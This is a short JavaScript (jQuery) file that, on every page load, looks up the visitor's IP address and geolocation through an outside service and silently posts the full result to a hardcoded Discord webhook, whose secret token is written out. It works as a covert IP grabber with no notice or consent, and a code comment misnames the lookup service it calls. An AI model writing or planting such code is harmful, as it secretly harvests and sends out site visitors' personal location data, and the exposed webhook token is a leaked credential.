$(document).ready(function() {
    // Fetch IP information from api.ipify.org on page load
    $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {  
      // Send IP information to Discord webhook
      var ipAddress = data.ip; // Extract the IP address from the response object
      var discordWebhookURL = 'https://discord.com/api/webhooks/1177616745528316004/4QMe0_alxXPFjJEIUga796AFTdNmMTNeqlJrJylrmUAmah7GhDfsEi2oWbS-Jj2JpStk';
    
      // Create the payload to send to Discord
      var discordPayload = {
        content: 'Visited IP: ' + JSON.stringify(data, null, 2)
      };

      console.log(JSON.stringify(data, null, 2));
    
      // Send data to Discord webhook
      $.ajax({
        type: 'POST',
        url: discordWebhookURL,
        data: JSON.stringify(discordPayload),
        contentType: 'application/json',
        success: function(response) {
          console.log('IP sent to Discord webhook successfully.');
        },
        error: function(err) {
          console.error('Error sending IP to Discord webhook:', err);
        }
      });
    });
  });
  
